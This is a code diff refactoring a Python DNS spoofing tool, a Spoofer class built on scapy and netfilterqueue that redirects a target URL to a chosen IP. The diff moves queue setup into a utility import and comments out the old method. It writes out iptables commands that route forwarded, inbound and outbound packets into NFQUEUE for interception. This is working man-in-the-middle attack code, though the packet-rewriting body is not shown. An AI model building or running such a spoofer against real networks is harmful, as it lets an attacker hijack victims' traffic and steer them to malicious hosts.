@@ -14,13 +14,14 @@ to the redirect IP. (see: DNS Spoofing)
 import subprocess
 import netfilterqueue
 import scapy.all as scapy
-from utils.enable_port_fwd import enable_port_fwd
+from utils.instantiate_queue import instantiate_queue
 
 class Spoofer:
     def __init__(self, target_url, redirect_ip):
         self.target_url = target_url
         self.redirect_ip = redirect_ip
-        self.instantiate_queue()
+        instantiate_queue()
+        self.bind_queue()
         
     def process_packet(self, packet): 
         """
@@ -55,17 +56,17 @@ class Spoofer:
         queue.bind(0, self.process_packet)
         queue.run()
 
-    def instantiate_queue(self):
-        """
-        Enables queue by setting IP Tables rules to accomodate forwarding.
-        """
-        print("[+] Instantiating queue...")
-        cmd = "iptables -I FORWARD -j NFQUEUE --queue-num 0"
-        test_cmd = "iptables -I OUTPUT -j NFQUEUE --queue-num 0; iptables -I INPUT -j NFQUEUE --queue-num 0"
-        enable_port_fwd()
-        proc = subprocess.Popen(test_cmd, shell=True, stdout=subprocess.PIPE)
-        print(proc.communicate()[0]),
-        self.bind_queue()
+    # def instantiate_queue(self):
+    #     """
+    #     Enables queue by setting IP Tables rules to accomodate forwarding.
+    #     """
+    #     print("[+] Instantiating queue...")
+    #     cmd = "iptables -I FORWARD -j NFQUEUE --queue-num 0"
+    #     enable_port_fwd()
+    #     proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+    #     print(proc.communicate()[0]),
+    #     self.bind_queue()
 
 
+# test_cmd = "iptables -I OUTPUT -j NFQUEUE --queue-num 0; iptables -I INPUT -j NFQUEUE --queue-num 0"
         
